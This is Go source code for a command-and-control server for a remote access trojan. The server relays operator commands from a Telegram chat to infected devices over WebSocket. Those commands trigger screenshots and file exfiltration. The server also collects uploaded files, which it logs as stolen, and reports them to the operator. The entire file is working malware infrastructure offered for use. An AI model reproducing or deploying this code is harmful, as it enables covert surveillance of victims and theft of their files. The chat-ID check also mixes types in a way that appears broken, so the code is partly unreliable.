package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/gorilla/websocket"
)

var (
	token   = os.Getenv("TELEGRAM_TOKEN")
	chatID  = os.Getenv("CHAT_ID")
	clients = make(map[*websocket.Conn]struct{})
	upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	// Bot polling for commands
	go func() {
		b, err := bot.New(token)
		if err != nil {
			log.Fatal(err)
		}
		b.RegisterHandler(bot.HandlerTypeMessageText, func(ctx context.Context, b *bot.Bot, update *models.Update) {
			if update.Message.Chat.ID != chatID {
				return
			}
			msg := strings.ToLower(update.Message.Text)
			switch {
			case msg == "/start":
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Wybierz urządzenie:"})
			case strings.Contains(msg, "screenshot"):
				broadcastWS("screenshot")
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent."})
			case strings.Contains(msg, "send_file"):
				broadcastWS("send_file")
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "File exfil triggered."})
			}
		})
		b.Start(ctx)
	}()

	// HTTP handlers
	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/upload_chunked", chunkedHandler)
	http.HandleFunc("/ws", wsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}
	log.Printf("C2 live on :%s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]interface{}{
		"base_url":          r.Host,
		"connected_devices": []string{},
		"status":            "running",
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "No file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	data, _ := io.ReadAll(file)
	msg := fmt.Sprintf("Stolen file: %s (%dB)", header.Filename, len(data))
	log.Println(msg)
	sendMsg(msg)
	w.Write([]byte("OK"))
}

func chunkedHandler(w http.ResponseWriter, r *http.Request) {
	data, _ := io.ReadAll(r.Body)
	msg := fmt.Sprintf("Chunked exfil: %dB", len(data))
	log.Println(msg)
	sendMsg(msg)
	w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
	clients[conn] = struct{}{}
	log.Println("RAT connected via WS")

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			delete(clients, conn)
			conn.Close()
			break
		}
		cmd := string(msg)
		log.Printf("RAT report: %s", cmd)
		sendMsg("RAT: " + cmd)
	}
}

func broadcastWS(cmd string) {
	for conn := range clients {
		conn.WriteMessage(websocket.TextMessage, []byte(cmd))
	}
}

func sendMsg(text string) {
	b, err := bot.New(token)
	if err != nil {
		return
	}
	b.SendMessage(context.Background(), &bot.SendMessageParams{
		ChatID: chatID,
		Text:   text,
	})
}
